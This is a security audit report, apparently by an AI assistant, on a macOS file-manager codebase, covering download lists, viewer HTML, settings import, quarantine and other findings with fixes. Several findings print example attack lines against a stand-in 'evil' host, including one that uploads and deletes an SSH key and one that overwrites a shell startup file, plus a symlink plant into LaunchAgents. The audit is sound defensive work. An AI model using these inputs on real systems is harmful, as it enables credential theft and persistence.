# Audit security across codebase

No critical or high findings after tracing all eleven classes, though several modules were only sampled (listed at the end). The code is defensively written in most places; what remains is five medium issues and a set of low ones. All paths are under `/Users/cm0k/Claude/Projects/TotalCommander/Sources`. Nothing in the project was modified; two experiments are in `…/scratchpad/review2/security/` (`webtest.swift`, `tmpdir.swift`).

## Findings

### 1. MEDIUM — Download list is an unconfirmed script that can overwrite files silently
- **Class:** path construction / missing confirmation
- **Flow:** list file → `Plugins/Network/NetworkCommands.swift:359` (`String(contentsOf:)`, no cap) → `Plugins/Network/DownloadList.swift:22-46` (`copy:`, `put:`, `move:`, `A -> B`) → `NetworkCommands.swift:455-456` (`fileSystems.location(from:)` accepts any scheme, absolute path or `~`) → `:463` transfer → `:468` `move(arrived, to: to, replacing: true)`.
- **Scenario:** the user runs "FTP Download From List" on an `ftplist.txt` that came with a download. A line `ftp://evil/a -> /Users/me/.zshrc` copies `a` into `~` and then renames it over `.zshrc` with no overwrite prompt. A line `move:~/.ssh/id_ed25519 -> ftp://evil/k` uploads and deletes a key. Nothing is shown before the run starts.
- **Fix:** show the parsed actions and require confirmation; restrict to remote→local unless the line says `put:`; use `replacing: false` plus the normal overwrite question; cap the list size.
- **Confidence:** confirmed by reading.

### 2. MEDIUM — HTML page mode loads remote content via meta refresh
- **Class:** web-content loading
- **Flow:** HTML file → `Plugins/Viewer/UI/ViewerPane.swift:558,584` → `Plugins/Viewer/UI/RichViews.swift:278` (`loadHTMLString`, CSP meta prepended) → delegate `RichViews.swift:281-288` allows every `.other` navigation.
- **Scenario:** `<meta http-equiv="refresh" content="0;url=https://evil/…">` is a `.other` navigation and CSP does not govern navigations. I reproduced it with the same configuration: the request was sent and the web view ended on the remote URL. The class comment "nothing is loaded from elsewhere" is therefore false; the result is an IP/open beacon and remote, CSP-free content inside the viewer (JavaScript stays off).
- **Related:** `ViewerPane.swift:624-630` `followLink` loads any non-http link into the viewer, so a click on `ftp://evil/x` or `sftp://…` opens a connection (see 6).
- **Fix:** allow only the first navigation (or only `about:blank`) and cancel the rest; in `followLink` accept only relative links and `file:` in the same folder.
- **Confidence:** confirmed by experiment.

### 3. MEDIUM — Settings import silently installs execution configuration
- **Class:** deserialisation / trust
- **Flow:** `Plugins/Configuration/ConfigurationCenter.swift:272` (`Data(contentsOf:)`, no cap) → `ConfigurationModels.swift:318-327` (any key accepted) → `:289-292` written to UserDefaults → `ConfigurationCenter.swift:301-311` applied immediately.
- **What an imported file can set, with only "The settings were imported" shown:**
  - user commands, Start-menu entries and key bindings that run shell lines (`CommandRunner.swift:247`, `<login shell> -l -c`), e.g. Enter rebound to an `em_` command;
  - the F4 editor path (`MacIntegrationPlugin.swift:77-79`) and the terminal application path (`SystemToolsPlugin.swift:253-255`);
  - `network.trustedCertificates` (`SavedConnections.swift:240`), which pre-accepts an attacker certificate for a host;
  - `network.connections` entries that reuse an existing connection UUID with another host; the Keychain password is looked up by UUID only (`RemoteFileSystem.swift:65`) and would be sent there;
  - `left.tabs` / `right.tabs` with remote URLs, opened at next launch (see 6).
- **Fix:** before applying, summarise what the file contains that executes or connects and ask; whitelist keys; never import trusted certificates; bind the Keychain item to host, port and user as well as the id (`kSecAttrServer`-style attributes); cap the file size.
- **Confidence:** confirmed by reading.

### 4. MEDIUM — Files from FTP/SFTP are never quarantined
- **Class:** quarantine / Gatekeeper
- **Flow:** the remote provider inherits the default `quarantine(of:) → nil` (`AFMKernel/FileSystem/FileSystemProvider.swift:362`; no implementation in `Plugins/Network`), so `FileJob.swift:789,860,897` have nothing to set. `Resources/Info.plist` has no `LSFileQuarantineEnabled`. Enter then calls `NSWorkspace.open` (`MacIntegrationPlugin.swift:118-121`).
- **Scenario:** an `.app`, `.pkg`, `.terminal` or `.command` downloaded from a server opens with no Gatekeeper check. Archives fetched from a server and unpacked inherit nothing either (`OpenArchive.swift:210`).
- **Fix:** have the remote file system return a synthesised quarantine value (flags `0083`, agent name) for everything it downloads, including viewer and archive temp copies; or set `LSFileQuarantineEnabled` and exempt local copies.
- **Confidence:** confirmed by reading.

### 5. MEDIUM — "Encrypt (ZIP only)" uses broken ZipCrypto with no warning
- **Class:** weak cryptography
- **Flow:** `Plugins/Archives/ArchiveCommands.swift:234,258-261,309` (dialog detail is empty) → `Packer.swift:36-41,84` → `ZipFormat.swift:253-255` (commented "It is weak"). AES archives cannot be read either (`OpenArchive.swift:623`).
- **Scenario:** the user believes the archive is protected; known-plaintext attacks recover the keys in minutes.
- **Fix:** implement WinZip AES-256 (CommonCrypto), or label the option "legacy, weak encryption" in the dialog.
- **Confidence:** confirmed by reading.

### 6. LOW/MEDIUM — Any URL from an untrusted file triggers an unprompted connection
- **Class:** URL scheme handling
- **Flow:** `Plugins/Network/RemoteFileSystem.swift:57-84` creates a session for whatever host a URL names (anonymous FTP, or `ssh` as `NSUserName()` with the user's keys and config).
- **Sources:** tab files (`FolderTabs/TabFile.swift:71` → `FolderTabsPlugin.swift:263,417`), file lists (`VirtualFolders/VirtualFoldersPlugin.swift:188-193`, also an unbounded read), restored tabs at launch (`AFMShell/Window/PanelCoordinator.swift:32,52`), viewer links (see 2), and the private drag type `afm.panel-item` (`AFMShell/Panel/PanelDragAndDrop.swift:25`).
- **Mitigation already present:** stored passwords only go to a matching scheme+host+port; an unknown SSH host key is asked about.
- **Fix:** connect implicitly only to saved or already-connected servers; otherwise ask "Connect to X?".
- **Confidence:** confirmed by reading.

### 7. LOW/MEDIUM — `Name.app` typed on the command line resolves in the current folder first
- **Class:** search-path hijack
- **Flow:** `Plugins/SystemTools/CommandLine.swift:71-72` → `SystemToolsPlugin.swift:178-191` (`openApplication`).
- **Scenario:** typing `Preview.app file.pdf` while the panel shows a USB stick or unpacked archive containing a planted `Preview.app` launches it (unquarantined there).
- **Fix:** search the application folders first; use the panel folder only for `./X.app`.
- **Confidence:** confirmed by reading.

### 8. LOW/MEDIUM — Destructive prompts default to "Yes"; untrusted names are rendered raw everywhere
- **Class:** UI spoofing
- `Plugins/FileOperations/FileOperationsPlugin.swift:329-331`: buttons `["Yes","No"]`, and the first button is the Return default (`AFMShell/App/AlertInteraction.swift:32-37`), even for "Permanently delete".
- `Plugins/FileOperations/TargetSpec.swift:130-135` interpolates the bare name with no path; no code neutralises newlines, U+202E or zero-width characters in alerts, titles or the list.
- A newline in a file name forges lines in the operation log (`FileOperations/OperationLog.swift:114-121`).
- A newline in a file name adds entries to `%L`/`%F` list files (`Configuration/ParameterExpansion.swift:514-516`), so a user command processes paths the user did not select.
- **Fix:** one display-escaping helper for control and bidi characters; default button "No" for `.critical`; escape `\n` in logs; refuse or escape names with newlines in list files.
- **Confidence:** confirmed by reading.

### 9. LOW — RTF and PDF links open any scheme
- `Plugins/Viewer/UI/RichViews.swift:297-313`: `NSTextView` and `PDFView` have no link delegate, so a click on `file:///Volumes/USB/x.app` or `smb://evil/share` goes to LaunchServices.
- **Fix:** implement `textView(_:clickedOnLink:at:)` and `pdfViewWillClick(onLink:with:)`; allow http/https/mailto after showing the real URL.
- **Confidence:** plausible (framework default behaviour, not tested).

### 10. LOW — Path-based operations in attacker-writable folders
- **Class:** symlink race
- Unpack creates folders with `createDirectory(withIntermediateDirectories:)` (`LocalFileSystem/LocalFileSystem.swift:353`, from `Archives/Unpacker.swift:291-306`), which accepts an existing symlink-to-directory. Stage one plants `docs -> ~/Library/LaunchAgents` (symlink targets are unrestricted, `Unpacker.swift:364-366`); a second unpack writes through it.
- `Writer.close` sets mode and time by path after closing (`LocalFileSystem.swift:405-411`); it should use `fchmod`/`futimens`.
- Recursive delete and copy re-open children by path (`FileOperations/FileJob.swift:1222-1300`, `LocalFileSystem.swift:68,180`).
- Archive modes are applied as stored, including world-writable (`Archives/Tar.swift:93`).
- **Fix:** `openat`/`O_NOFOLLOW` walking for unpack and delete; refuse symlinked parents inside the unpack root; mask modes with `~022`.
- **Confidence:** plausible; the single-archive symlink-then-file case is verified blocked.

### 11. LOW — FIFOs and devices can hang threads
- **Class:** DoS
- `LocalFileSystem.swift:334-336` opens without `O_NONBLOCK` or a type check.
- Callers that do not test `isSpecial`: `FileProperties/Descript.swift:215-225` (a FIFO named `descript.ion` blocks the comment loader with no cancel), and checksum entries with absolute or `..` paths (`FileTools/ChecksumFiles.swift:367-370`, e.g. `/dev/zero`).
- **Fix:** in `read`, open `O_NONBLOCK`, `fstat`, and refuse non-regular files.
- **Confidence:** plausible.

### 12. LOW — FTP
- The active-mode listener binds all interfaces and takes the first peer without comparing it to the server (`Network/NetStream.swift:563-593`).
- Plain FTP sends `PASS` with no cleartext warning (`Network/FTPConnection.swift:234-236`).

### 13. LOW — Build hardening
- `Scripts/build-app.sh`: ad-hoc signature, no `--options runtime`, no entitlements, no sandbox, so `DYLD_INSERT_LIBRARIES`/`DYLD_LIBRARY_PATH` are honoured (this also affects the ICU `dlopen`).
- No `NSAppleEventsUsageDescription`, although `osascript` drives Finder (`FileProperties/FilePropertiesPlugin.swift:95-103`).

### 14. LOW — Privacy and leftovers
- Folder trees of every scanned volume are stored in plaintext in `~/Library/Application Support/<product>/TreeCache/` (`Places/TreeCache.swift:68-74,180`) and outlive encrypted or removable volumes.
- Settings export includes every stored key (`ConfigurationCenter.swift:254-263`): command-line history (`SystemToolsPlugin.swift:166`), directory history, servers and users, trusted certificates.
- `renlog.txt` sits in temp (`MultiRename/MultiRenamePlugin.swift:52`).
- `afm-archives-<pid>-…` scratch (remote archive copies, unpacked members) is not swept after a crash (`Archives/ByteStreams.swift:465`); the viewer and list folders are swept.

### 15. LOW — Shell-line construction slips (user-configured commands)
- `Configuration/CommandRunner.swift:290`: `line.drop { $0 != " " }` cuts a quoted application path containing a space mid-word and yields an unbalanced line.
- `Configuration/ParameterExpansion.swift:425-429`: names inside user-quoted `"%S"` get no `./` guard against a leading `-`.

## Process-execution sites

| Site | Executable | Arguments / environment | Status |
|---|---|---|---|
| `Configuration/CommandRunner.swift:244-255` | `$SHELL`, passwd entry, or `/bin/zsh` | `-l -c <user command + expanded parameters>`; cwd = start path or panel folder | Shell by design; file names quoted (`ParameterExpansion.swift:282-287`), `./` guard for leading `-`; caveats in 3, 8, 15 |
| `SystemTools/CommandLine.swift:153` via `SystemToolsPlugin.swift:174` | login shell | `-l -c <typed line>` | By design; output capped at 8 MB; SIGTERM/SIGKILL on cancel |
| `SystemToolsPlugin.swift:516` | `/usr/bin/lpr` | absolute file paths | Sound |
| `SystemToolsPlugin.swift:189,191,282,549`; `MacIntegrationPlugin.swift:95,98,133` | LaunchServices | file URLs; application from settings or picker | See 3, 4, 7 |
| `FileProperties/FilePropertiesPlugin.swift:98-103` | `/usr/bin/osascript` | fixed script; paths passed as `on run` argv, not interpolated | Sound |
| `Archives/OpenArchive.swift:270` | `/usr/bin/bsdtar` | `-cf - --format pax @<absolute path>`; converts to a stream, never extracts | Sound |
| `Archives/Codecs.swift:508` / `:588` | `/usr/bin/bzip2` | `-dc -- <path>` / `-c -N` on stdin | Sound |
| `Network/SFTPSession.swift:102` + `SFTPChannel.swift:273-280` | `/usr/bin/ssh` | forwarding disabled, `-l user` (leading `-` rejected), `-s -- host sftp`; askpass through FIFOs in a 0700 folder, no secret in env or argv | Sound |
| `Archives/ArchiveCommands.swift:163` | `NSWorkspace.open` | unpacked member, mode 0644, archive's quarantine copied, explicit dialog | Sound, bounded by 4 |
| `Viewer/UI/ViewerPane.swift:626`, `ViewerPane+Actions.swift:495-509` | `NSWorkspace.open` | http/https/mailto only | Sound |
| `AFMKernel/Panels/Sorting.swift:642-644` | `dlopen` of `/usr/lib/libicucore.A.dylib` | fixed path; all three `@convention(c)` signatures and enum constants match ICU; nil falls back; key buffers bounded (`:521-531`, `:564`) | Sound, bounded by 13 |

There is no `system`, `popen`, `posix_spawn`, `NSAppleScript`, `NSUserScriptTask` or XPC, and no URL-scheme, document, Services or Apple-event handlers (checked `Info.plist`, `AFMShell/App/Shell.swift`, `main.swift`; argv is not read).

## Whole-file reads

| Site | Cap |
|---|---|
| `ConfigurationCenter.swift:272` settings import | none |
| `NetworkCommands.swift:334,359` download list | none |
| `VirtualFoldersPlugin.swift:192` file list | none |
| `Places/TreeCache.swift:85` own cache file | none (own data) |
| `Archives/Codecs.swift:375` bsdtar/bzip2 stderr | none (a warning per bad entry can grow it) |
| `Archives/Codecs.swift:333,335` bzip2 compress filter | bounded by our own piece size |
| `Viewer/UI/ViewerPane.swift:535-538` HTML/RTF/PDF/image from non-local sources | 1 GiB (`:505`); local files use `.mappedIfSafe` |
| `FileTools/ToolRun.swift:150` checksum files | 64 MiB |
| `FileTools/SplitCombine.swift:233` `.crc` | 64 KiB |
| `Archives/Tar.swift:229-231` pax / long-name records | 16 MiB |
| `Archives/Unpacker.swift:364` symlink target | 64 KiB |
| `FileProperties/Descript.swift:219-245` | `sizeLimit` |
| `FolderTabsPlugin.swift:404-408`, `SelectionPlugin.swift:457` | `tabFileLimit`, `readLimit` |
| `Network/SFTPChannel.swift:367` packet | 64 MiB |
| `SystemTools/CommandLine.swift:117` command output | 8 MiB |

## Verified sound
- **Server and archive names:** rejected or normalised at the source and again at the sink (`Network/FTPListParser.swift:32-35,55,91,111`, `SFTPSession.swift:211`, `Archives/ArchiveTree.swift:81-84`, `FileOperations/FileJob.swift:1499-1514`).
- **Decoded and combined names:** reduced to one component (`FileTools/Transcoding.swift:519-525`, `SplitCombine.swift:242-244`).
- **Local writes:** `O_CREAT|O_EXCL` then atomic or exclusive rename (`LocalFileSystem.swift:359,438-445`, `copyfile` exclusive `:537`); set-uid/gid bits stripped from tar (`Tar.swift:93`).
- **Temp files:** `TMPDIR` is not honoured (tested), so everything is in the per-user 0700 folder; the viewer block cache is `O_EXCL` 0600 and unlinked at once (`Viewer/Model/ByteSource.swift:292-300`); pid sweeps only remove folders of dead pids.
- **TLS:** system evaluation with host name, TLS 1.2 minimum, per-host SHA-256 exceptions (`Network/NetStream.swift:136-165`); refused `AUTH TLS` fails instead of downgrading (`:237-262`); `PROT P` enforced (`FTPConnection.swift:224-232`).
- **FTP protocol:** the PASV address is ignored in favour of the control peer (`FTPConnection.swift:446-454`); CR/LF/NUL rejected in commands (`:314`); `PASS` masked in the log (`:236`); ports clamped (`NetStream.swift:328`).
- **Credentials:** passwords only in the Keychain, stripped from history and last-server (`SavedConnections.swift:234-236`, `NetworkCommands.swift:373,386`).
- **Images:** downsampled to 8192 px with a 512 MiB animation budget (`Viewer/UI/ImageCanvasView.swift:22-75`).
- **Spotlight queries:** escaped (`FindFiles/SpotlightSearch.swift:28-63`).
- **Supply chain:** `Package.swift` has no dependencies; `unsafeFlags` only on test targets, pointing at a fixed root-owned path.
- **Trap constructs:** the only `try!` is a constant regex (`FTPListParser.swift:150`).

## Not covered
- ZIP central-directory and ZIP64 arithmetic, inflate/xz stream internals, and decompression-ratio limits beyond noting `SizeGuardStream` and `unpackedLimit` exist.
- FTP LIST date and size parsing, and SFTP attribute decoding bounds.
- `HTMLText` stripping and the `TextRows` / `ViewerSearch` pointer loops; I only sampled their bounds checks.
- User-regex backtracking in Find Files, Multi-Rename and Compare.
- Hotlist entry semantics, Directory Sync planning and Compare save paths.
- The pure-Swift hash implementations.
- No dynamic testing of the app itself; only the two standalone experiments.
